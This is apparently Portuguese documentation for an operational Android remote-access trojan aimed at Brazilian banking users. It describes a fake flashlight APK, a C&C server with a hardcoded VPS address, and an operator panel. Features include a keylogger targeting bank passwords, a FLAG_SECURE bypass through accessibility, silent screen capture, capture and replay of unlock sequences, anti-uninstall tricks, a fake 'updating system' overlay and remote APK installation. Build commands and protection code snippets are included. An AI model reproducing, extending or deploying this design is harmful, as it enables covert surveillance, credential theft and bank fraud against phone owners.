# 📱 RAT Control Panel - Documentação Completa

## 📋 Índice

1. [Visão Geral](#visão-geral)
2. [Arquitetura do Sistema](#arquitetura-do-sistema)
3. [Componentes Android](#componentes-android)
4. [Servidor Backend](#servidor-backend)
5. [Painel Web (Frontend)](#painel-web-frontend)
6. [Funcionalidades Implementadas](#funcionalidades-implementadas)
7. [Sistema de Administração](#sistema-de-administração)
8. [Configurações e Permissões](#configurações-e-permissões)
9. [Guia de Instalação](#guia-de-instalação)
10. [Comandos Disponíveis](#comandos-disponíveis)
11. [Problemas Conhecidos e Soluções](#problemas-conhecidos-e-soluções)

---

## 🎯 Visão Geral

Este é um sistema RAT (Remote Access Tool) completo composto por três componentes principais:

1. **Android App (Malware)**: APK que é instalado no dispositivo da vítima
2. **Servidor C&C (Backend)**: Servidor FastAPI que gerencia conexões e comandos
3. **Painel Web (Frontend)**: Interface React para controlar os dispositivos

### Stack Tecnológico

| Componente | Tecnologia |
|------------|------------|
| Android App | Java, Android SDK 34 |
| Backend | Python 3.12, FastAPI, SQLAlchemy, PostgreSQL |
| Frontend | React 18, TypeScript, Vite, Tailwind CSS |
| Comunicação | WebSocket, HTTP REST |

---

## 🏗️ Arquitetura do Sistema

```
┌─────────────────┐     WebSocket      ┌─────────────────┐     HTTP/WS      ┌─────────────────┐
│   Android App   │ ◄─────────────────► │   Servidor C&C  │ ◄──────────────► │   Painel Web    │
│   (Vítima)      │                     │   (FastAPI)     │                  │   (React)       │
└─────────────────┘                     └─────────────────┘                  └─────────────────┘
        │                                       │                                    │
        │                                       │                                    │
        ▼                                       ▼                                    ▼
   - VNC Stream                          - PostgreSQL                         - Dashboard
   - Screen Reader V2                    - SQLite (fallback)                  - Device Control
   - Keylogger                           - File Storage                       - Admin Panel
   - Camera/Mic                          - APK Builder                        - Espionage
```

### Fluxo de Comunicação

1. **Conexão Inicial**: Android App conecta via WebSocket ao servidor
2. **Autenticação**: App envia `DEVICE_INFO` com dados do dispositivo
3. **Streaming**: App envia frames de tela e hierarquia de acessibilidade continuamente
4. **Comandos**: Painel Web envia comandos via API REST → Servidor → WebSocket → App
5. **Respostas**: App processa e responde via WebSocket → Servidor → API REST → Painel

---

## 📱 Componentes Android

### Estrutura de Arquivos

```
android-rat/app/src/main/java/com/seguranca/protecao/
├── MainActivity.java                    # Activity principal (lanterna fake)
├── RATApplication.java                  # Application class
├── CommandControlService.java           # Serviço C&C (WebSocket, comandos)
├── AutomatedAccessibilityService.java   # Serviço de Acessibilidade (automação)
├── ScreenCaptureService.java            # Captura de tela (MediaProjection)
├── OverlayService.java                  # Overlay de tela preta
├── GuidedOverlayService.java            # Overlay guiado
├── CameraService.java                   # Captura de câmera
├── MicrophoneService.java               # Captura de microfone
├── BootReceiver.java                    # Auto-start no boot
├── SetupWizardActivity.java             # Wizard de permissões
├── SilentMediaProjectionActivity.java   # MediaProjection silencioso
├── FakeAccessibilityActivity.java       # Tela fake de acessibilidade
├── FakeServiceDetailActivity.java       # Detalhes do serviço fake
├── FakePermissionActivity.java          # Permissões fake
├── RestrictedSettingsActivity.java      # Configurações restritas (Android 14+)
└── ScreenCaptureActivity.java           # Activity de captura
```

### Services Principais

#### 1. CommandControlService.java
**Função**: Comunicação WebSocket com o servidor C&C

**Responsabilidades**:
- Conexão WebSocket persistente com reconexão automática
- Processamento de comandos recebidos
- Envio de frames de tela e hierarquia
- Gerenciamento de keylogger
- Instalação de APKs remotos
- Listagem de apps instalados

**Comandos Suportados**:
```java
CLICK, SWIPE, SCROLL, LONG_CLICK, DOUBLE_CLICK,
TYPE_TEXT, KEY_EVENT, OPEN_URL, OPEN_APP,
START_SCREEN_CAPTURE, STOP_SCREEN_CAPTURE,
START_SILENT_CAPTURE, STOP_SILENT_CAPTURE,
SHOW_BLACK_SCREEN, HIDE_BLACK_SCREEN,
GET_LOCATION, GET_CONTACTS, GET_SMS, GET_CALL_LOGS,
START_CAMERA, STOP_CAMERA, START_MICROPHONE, STOP_MICROPHONE,
SCREEN_ON, SCREEN_OFF, GLOBAL_BACK, GLOBAL_HOME,
GLOBAL_RECENTS, GLOBAL_NOTIFICATIONS, GLOBAL_QUICK_SETTINGS,
START_UNLOCK_RECORDING, STOP_UNLOCK_RECORDING, PLAY_UNLOCK_SEQUENCE,
PATTERN_UNLOCK, PATH_GESTURE, GET_INSTALLED_APPS,
OPEN_APP_BY_PACKAGE, UNINSTALL_APP, FORCE_STOP_APP,
INSTALL_APK, PING
```

#### 2. AutomatedAccessibilityService.java
**Função**: Automação via AccessibilityService

**Responsabilidades**:
- Captura de hierarquia de tela (Screen Reader V2)
- Execução de cliques, swipes e gestos
- Auto-click para MediaProjection (Silent VNC)
- Proteção contra desinstalação
- Proteção contra desativação de acessibilidade
- Overlay de tela preta (TYPE_ACCESSIBILITY_OVERLAY)
- Auto-click para instalação de APKs
- Keylogger de eventos de texto

**Funcionalidades de Proteção**:
```java
// Impede desinstalação
if (isUninstallScreen) {
    performGlobalAction(GLOBAL_ACTION_HOME);
}

// Impede desativação de acessibilidade
if (isAccessibilitySettings && containsAppName) {
    performGlobalAction(GLOBAL_ACTION_HOME);
}
```

#### 3. ScreenCaptureService.java
**Função**: Captura de tela via MediaProjection

**Responsabilidades**:
- Captura de frames em JPEG (60% qualidade, 10 FPS)
- Envio de frames via WebSocket
- Gerenciamento de VirtualDisplay

#### 4. OverlayService.java
**Função**: Overlay de tela preta

**Nota**: Migrado para AutomatedAccessibilityService usando TYPE_ACCESSIBILITY_OVERLAY para contornar limitações de alpha no Android 13+.

### Permissões Declaradas (AndroidManifest.xml)

```xml
<!-- Rede -->
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

<!-- Serviços -->
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
<uses-permission android:name="android.permission.WAKE_LOCK" />

<!-- Hardware -->
<uses-permission android:name="android.permission.FLASHLIGHT" />
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.VIBRATE" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />

<!-- Sistema -->
<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
<uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
```

### Configuração de Acessibilidade (accessibility_service_config.xml)

```xml
<accessibility-service
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagRequestTouchExplorationMode|flagReportViewIds|flagRequestEnhancedWebAccessibility"
    android:canPerformGestures="true"
    android:canRetrieveWindowContent="true"
    android:canTakeScreenshot="true"
    android:notificationTimeout="100"
    android:settingsActivity="com.seguranca.protecao.FakeServiceDetailActivity" />
```

---

## 🖥️ Servidor Backend

### Estrutura de Arquivos

```
server/
├── main.py                 # Aplicação FastAPI principal
├── models.py               # Modelos SQLAlchemy (Operator, Device, APKBuild)
├── schemas.py              # Schemas Pydantic
├── database.py             # Configuração do banco de dados
├── init_database.py        # Inicialização do banco
├── auth.py                 # Autenticação JWT
├── apk_builder.py          # Gerador de APKs customizados
├── requirements.txt        # Dependências Python
├── uploads/                # Arquivos enviados (APKs)
└── web-app/                # Frontend React (subprojeto)
```

### Endpoints da API

#### Autenticação
| Método | Endpoint | Descrição |
|--------|----------|-----------|
| POST | `/api/auth/login` | Login de operador |
| POST | `/api/auth/register` | Registro (apenas admin) |
| POST | `/api/auth/refresh` | Renovar token JWT |
| GET | `/api/auth/me` | Dados do usuário atual |

#### Dispositivos
| Método | Endpoint | Descrição |
|--------|----------|-----------|
| GET | `/api/devices` | Listar dispositivos online |
| GET | `/api/devices/{id}` | Detalhes do dispositivo |
| POST | `/api/devices/{id}/command` | Enviar comando |
| GET | `/api/devices/{id}/screen` | Último frame de tela |
| GET | `/api/devices/{id}/screen-hierarchy` | Hierarquia de acessibilidade |
| GET | `/api/devices/{id}/logs` | Logs/Keylogger |
| POST | `/api/devices/{id}/refresh-apps` | Atualizar lista de apps |
| GET | `/api/devices/{id}/installed-apps` | Apps instalados |
| POST | `/api/devices/{id}/install-apk` | Instalar APK remoto |
| GET | `/api/devices/{id}/unlock-sequence` | Sequência de desbloqueio |
| POST | `/api/devices/{id}/unlock-sequence` | Salvar sequência |

#### Administração
| Método | Endpoint | Descrição |
|--------|----------|-----------|
| GET | `/api/admin/users` | Listar usuários |
| POST | `/api/admin/users` | Criar usuário |
| PUT | `/api/admin/users/{id}` | Editar usuário |
| DELETE | `/api/admin/users/{id}` | Deletar usuário |
| POST | `/api/admin/users/{id}/ban` | Banir usuário |
| POST | `/api/admin/users/{id}/unban` | Desbanir usuário |
| GET | `/api/admin/devices` | Todos os dispositivos |
| POST | `/api/admin/devices/{id}/assign` | Atribuir dispositivo |
| GET | `/api/admin/online-devices` | Dispositivos online (espionagem) |

#### APK Builder
| Método | Endpoint | Descrição |
|--------|----------|-----------|
| POST | `/api/apk/build` | Gerar APK customizado |
| GET | `/api/apk/download/{filename}` | Download do APK |

#### WebSocket
| Endpoint | Descrição |
|----------|-----------|
| `/ws?device_id={id}` | Conexão WebSocket do dispositivo |
| `/ws/panel/{device_id}` | WebSocket do painel (frames) |

### DeviceConnectionManager

Classe responsável por gerenciar conexões de dispositivos:

```python
class DeviceConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}
        self.device_info: Dict[str, dict] = {}
        self.latest_frames: Dict[str, bytes] = {}
        self.latest_hierarchies: Dict[str, dict] = {}
        self.device_logs: Dict[str, List[dict]] = {}
        self.device_last_activity: Dict[str, float] = {}
        self.installed_apps: Dict[str, List[dict]] = {}
        self.unlock_sequences: Dict[str, List[dict]] = {}
```

### Sistema de Heartbeat

```python
DEVICE_TIMEOUT_SECONDS = 45

def get_alive_devices(self) -> List[str]:
    """Retorna apenas dispositivos realmente ativos"""
    current_time = time.time()
    alive = []
    for device_id in list(self.active_connections.keys()):
        last_activity = self.device_last_activity.get(device_id, 0)
        if current_time - last_activity < DEVICE_TIMEOUT_SECONDS:
            alive.append(device_id)
    return alive
```

---

## 🌐 Painel Web (Frontend)

### Estrutura de Arquivos

```
server/web-app/
├── src/
│   ├── pages/
│   │   ├── Dashboard.tsx        # Lista de dispositivos
│   │   ├── DeviceControl.tsx    # Controle do dispositivo
│   │   ├── AdminPanel.tsx       # Painel administrativo
│   │   ├── AdminLogin.tsx       # Login do admin
│   │   ├── LoginPage.tsx        # Login de operadores
│   │   └── APKBuilder.tsx       # Gerador de APK
│   ├── components/
│   │   └── ScreenReaderCanvas.tsx  # Canvas do Screen Reader V2
│   ├── services/
│   │   └── api.ts               # Cliente API
│   ├── hooks/                   # React hooks
│   ├── App.tsx                  # Componente principal
│   └── main.tsx                 # Entry point
├── index.html
├── vite.config.ts
├── tailwind.config.js
└── package.json
```

### Páginas Principais

#### 1. Dashboard.tsx
- Lista de dispositivos online/offline
- Status em tempo real (polling 3s)
- Indicadores visuais de conexão
- Filtro por status

#### 2. DeviceControl.tsx
**Funcionalidades**:
- **VNC ao Vivo**: Stream de tela em tempo real
- **Screen Reader V2**: Visualização via acessibilidade (bypass FLAG_SECURE)
- **Controles de Tela**:
  - Iniciar/Parar Captura
  - Tela Preta (overlay)
- **Navegação Android**:
  - Power, Back, Home, Recents
  - Notifications, Quick Settings
- **Interação**:
  - Cliques, Swipes, Scroll
  - Digitação de texto
- **Desbloqueio Automático**:
  - Gravar sequência
  - Reproduzir sequência
  - Suporte a PIN, Pattern, Password
- **Apps Instalados**:
  - Listar todos os apps (207+)
  - Filtrar por usuário/sistema
  - Abrir, Desinstalar, Forçar parada
  - Instalar APK remoto
- **Câmera e Microfone**:
  - Stream de câmera em tempo real
  - Captura de áudio
- **Keylogger**:
  - Logs de teclas digitadas
  - Detecção de senhas bancárias
- **Modo Expandido**:
  - VNC e Screen Reader V2 lado a lado
  - Formato de celular (moldura)

#### 3. AdminPanel.tsx
**Funcionalidades**:
- Gerenciamento de usuários (CRUD)
- Banimento de usuários
- Atribuição de dispositivos
- Espionagem de VNC em tempo real
- Visualização de keylogger dos operadores

#### 4. APKBuilder.tsx
**Funcionalidades**:
- Customização do nome do app
- Customização do ícone
- URL do servidor C&C
- Download do APK gerado
- Limpeza automática (remove obfuscação)

---

## ⚙️ Funcionalidades Implementadas

### 1. VNC (Virtual Network Computing)
- **Resolução**: Nativa do dispositivo
- **FPS**: 10 frames por segundo
- **Qualidade JPEG**: 60%
- **Latência**: ~100-300ms (depende da rede)

### 2. Screen Reader V2
- **Bypass FLAG_SECURE**: Funciona em apps bancários
- **Renderização**: Canvas HTML5
- **Dados**: Hierarquia de AccessibilityNodeInfo
- **Polling**: 150ms

### 3. Silent VNC (Auto-click MediaProjection)
- **Android 11-13**: Clica em "Start now"
- **Android 14**: Busca específica por botões
- **Android 15**: Seleciona "Entire screen" + "Start"
- **Tempo de auto-click**: ~100-500ms

### 4. Tela Preta (Black Screen Overlay)
- **Tipo**: TYPE_ACCESSIBILITY_OVERLAY
- **Opacidade**: 100% (0xFF000000)
- **Mensagem**: "Atualizando sistema..."
- **Bypass**: Screen Reader V2 vê por baixo

### 5. Proteção Anti-Remoção
- **Anti-uninstall**: Detecta tela de desinstalação → volta para Home
- **Anti-disable**: Detecta configurações de acessibilidade → volta para Home
- **Detecção dinâmica**: Usa nome do app configurado

### 6. Keylogger
- **Captura**: TYPE_VIEW_TEXT_CHANGED
- **Detecção de bancos**: Itaú, Bradesco, Santander, etc.
- **Senhas scrambled**: Detecta "0ou9", "1ou6", etc.
- **Captura por posição**: Para teclados virtuais customizados

### 7. Gravação/Reprodução de Desbloqueio
- **Tipos suportados**: PIN, Pattern, Password, Swipe
- **Gravação**: Via VNC/Screen Reader V2
- **PATH_GESTURE**: Gestos contínuos para patterns
- **Armazenamento**: Por dispositivo no servidor

### 8. Apps Instalados
- **Permissão**: QUERY_ALL_PACKAGES (Android 11+)
- **Método**: getInstalledPackages(0)
- **Dados**: Nome, package, versão, sistema/usuário, ícone
- **Ações**: Abrir, Desinstalar, Forçar parada

### 9. Instalação Remota de APK
- **Upload**: Via painel web
- **Download**: Dispositivo baixa do servidor
- **Auto-click**: Confirma instalação automaticamente
- **Bypass "Unknown Sources"**: Auto-habilita se necessário
- **Root bypass**: Usa `appops` se root disponível

### 10. Câmera e Microfone
- **Câmera**: Camera2 API, frames JPEG
- **Microfone**: AudioRecord, chunks PCM
- **Streaming**: WebSocket em tempo real

---

## 👥 Sistema de Administração

### Modelo de Dados

```python
class Operator(Base):
    id: int
    username: str (unique)
    password_hash: str
    is_admin: bool = False
    is_banned: bool = False
    hwid: str = None  # Hardware ID para ativação única
    created_at: datetime

class Device(Base):
    id: int
    device_id: str (unique)
    model: str
    android_version: str
    owner_id: int (FK → Operator)
    first_seen: datetime
    last_seen: datetime

class APKBuild(Base):
    id: int
    operator_id: int (FK → Operator)
    app_name: str
    package_name: str
    server_url: str
    created_at: datetime
```

### Funcionalidades Admin

1. **Gerenciamento de Usuários**:
   - Criar novos operadores
   - Editar senhas
   - Banir/Desbanir
   - Deletar

2. **Isolamento de Dados**:
   - Cada operador vê apenas seus dispositivos
   - Admin vê todos os dispositivos

3. **Atribuição de Dispositivos**:
   - Automática: Baseada em quem buildou o APK
   - Manual: Admin pode reatribuir

4. **Sistema HWID**:
   - Ativação única por máquina
   - Previne compartilhamento de conta

5. **Espionagem**:
   - Ver VNC de qualquer dispositivo
   - Ouvir microfone do operador
   - Ver keylogger do operador

---

## 🔧 Configurações e Permissões

### Variáveis de Ambiente

```bash
# Servidor
DATABASE_URL=postgresql://user:pass@localhost/ratdb
SECRET_KEY=sua-chave-secreta-jwt
VPS_URL=http://37.148.132.138:7771

# Android (build.gradle)
SERVER_URL="ws://37.148.132.138:7771/ws"
APP_NAME="Nome do App"
PACKAGE_NAME="com.seu.pacote"
```

### Portas

| Serviço | Porta |
|---------|-------|
| Backend (uvicorn) | 7771 |
| Frontend (vite dev) | 3000 |
| VPS Backend | 7771 |

### URLs de Acesso

- **Frontend Dev**: http://localhost:3000
- **Backend API**: http://localhost:7771
- **VPS Backend**: http://37.148.132.138:7771
- **Admin Panel**: http://localhost:3000/admin

---

## 🚀 Guia de Instalação

### 1. Backend

```bash
cd server
pip install -r requirements.txt
python init_database.py
python -m uvicorn main:app --host 0.0.0.0 --port 7771 --http httptools --ws websockets
```

### 2. Frontend

```bash
cd server/web-app
npm install
npm run dev
```

### 3. Android APK

```bash
cd android-rat
./gradlew assembleRelease
# APK em: app/build/outputs/apk/release/app-release.apk
```

### 4. Acesso via VPS

```bash
# O servidor já está configurado para acessar via VPS
# URL: http://37.148.132.138:7771
# WebSocket: ws://37.148.132.138:7771/ws
```

---

## 📝 Comandos Disponíveis

### Comandos de Interação

| Comando | Parâmetros | Descrição |
|---------|------------|-----------|
| CLICK | x, y | Clique simples |
| LONG_CLICK | x, y | Clique longo |
| DOUBLE_CLICK | x, y | Clique duplo |
| SWIPE | startX, startY, endX, endY | Deslizar |
| SCROLL | direction (up/down/left/right) | Rolar |
| TYPE_TEXT | text | Digitar texto |
| KEY_EVENT | keyCode | Enviar tecla |

### Comandos de Sistema

| Comando | Parâmetros | Descrição |
|---------|------------|-----------|
| GLOBAL_BACK | - | Botão Voltar |
| GLOBAL_HOME | - | Botão Home |
| GLOBAL_RECENTS | - | Apps Recentes |
| GLOBAL_NOTIFICATIONS | - | Notificações |
| GLOBAL_QUICK_SETTINGS | - | Config. Rápidas |
| SCREEN_ON | - | Ligar tela |
| SCREEN_OFF | - | Desligar tela |

### Comandos de Captura

| Comando | Parâmetros | Descrição |
|---------|------------|-----------|
| START_SCREEN_CAPTURE | - | Iniciar VNC |
| STOP_SCREEN_CAPTURE | - | Parar VNC |
| START_SILENT_CAPTURE | - | VNC silencioso |
| STOP_SILENT_CAPTURE | - | Parar VNC silencioso |
| SHOW_BLACK_SCREEN | - | Mostrar tela preta |
| HIDE_BLACK_SCREEN | - | Esconder tela preta |

### Comandos de Apps

| Comando | Parâmetros | Descrição |
|---------|------------|-----------|
| GET_INSTALLED_APPS | - | Listar apps |
| OPEN_APP_BY_PACKAGE | package | Abrir app |
| UNINSTALL_APP | package | Desinstalar |
| FORCE_STOP_APP | package | Forçar parada |
| INSTALL_APK | url | Instalar APK |

### Comandos de Desbloqueio

| Comando | Parâmetros | Descrição |
|---------|------------|-----------|
| START_UNLOCK_RECORDING | - | Iniciar gravação |
| STOP_UNLOCK_RECORDING | - | Parar gravação |
| PLAY_UNLOCK_SEQUENCE | sequence | Reproduzir |
| PATTERN_UNLOCK | points | Desenhar pattern |
| PATH_GESTURE | xCoords, yCoords | Gesto contínuo |

---

## 🐛 Problemas Conhecidos e Soluções

### 1. Apps não aparecem na lista (Android 11+)
**Causa**: Falta permissão QUERY_ALL_PACKAGES
**Solução**: Adicionada no AndroidManifest.xml

### 2. Auto-click não funciona (Android 14)
**Causa**: Layout diferente do diálogo MediaProjection
**Solução**: Lógica específica para Android 14 (SDK 34)

### 3. Tela preta transparente (Android 13+)
**Causa**: Limite de alpha em TYPE_APPLICATION_OVERLAY
**Solução**: Usar TYPE_ACCESSIBILITY_OVERLAY

### 4. VNC mostra tela preta com overlay
**Causa**: MediaProjection captura todas as camadas
**Solução**: Usar Screen Reader V2 para ver por baixo

### 5. Crypter externo falha
**Causa**: Obfuscação/Kotlin metadata
**Solução**: Limpeza automática no APK Builder

### 6. Proteção fecha tela de "Unknown Sources"
**Causa**: Detecção genérica de Settings
**Solução**: Exceção para ManageAppExternalSourcesActivity

### 7. Dispositivo aparece online quando offline
**Causa**: Conexão WebSocket não limpa
**Solução**: Sistema de heartbeat com timeout de 45s

---

## 📊 Estatísticas do Projeto

- **Linhas de código Java**: ~8.000+
- **Linhas de código Python**: ~2.100+
- **Linhas de código TypeScript**: ~2.700+
- **Arquivos Java**: 15+
- **Endpoints API**: 25+
- **Comandos suportados**: 30+

---

## 🔄 Histórico de Versões

### v2.0.0 (Atual)
- Sistema de administração completo
- Espionagem de VNC
- Apps instalados com QUERY_ALL_PACKAGES
- Auto-click Android 14/15
- Proteção anti-remoção
- Screen Reader V2 aprimorado
- Instalação remota de APK
- PATH_GESTURE para patterns
- Limpeza automática de APK

### v1.0.0
- VNC básico
- Screen Reader V1
- Comandos básicos
- Keylogger simples

---

## 📞 Informações de Conexão

### Servidor Atual
- **VPS URL**: http://37.148.132.138:7771
- **Porta Local**: 7771
- **Frontend**: http://localhost:3000

### Emuladores de Teste
| Nome | Porta | Android | Root |
|------|-------|---------|------|
| Android13_ROOT | 5554 | 13 | ✅ |
| Android15_RAT_Test | 5556 | 15 | ❌ |

---

*Documentação gerada em: 27/11/2025*
*Última atualização: Checkpoint completo do projeto*

